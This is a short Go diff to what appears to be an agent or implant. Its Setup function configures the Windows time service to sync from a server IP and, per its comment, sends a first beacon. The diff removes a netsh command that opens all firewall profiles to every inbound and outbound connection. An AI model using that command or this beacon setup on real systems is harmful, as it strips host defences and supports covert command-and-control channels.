@@ -19,7 +19,7 @@ type Agent struct {
 	MyIP      []byte
 }
 
-//Setup - sets up NTP configurations based on OS, sends out first beacon, add firewall rule every 5?
+//Setup - sets up NTP configurations based on OS, sends out first beacon
 func Setup(newAgent Agent) {
 	var commandList []string
 	strIP := net.IP(newAgent.ServerIP).String()
@@ -28,7 +28,6 @@ func Setup(newAgent Agent) {
 		commandList = []string{
 			"net start w32time",
 			"sc config w32time start=auto",
-			"netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound",
 			"w32tm /config /syncfromflags:manual /manualpeerlist:" + strIP + " /update",
 			"w32tm /resync"}
 	} else if newAgent.OpSys == "Linux" {
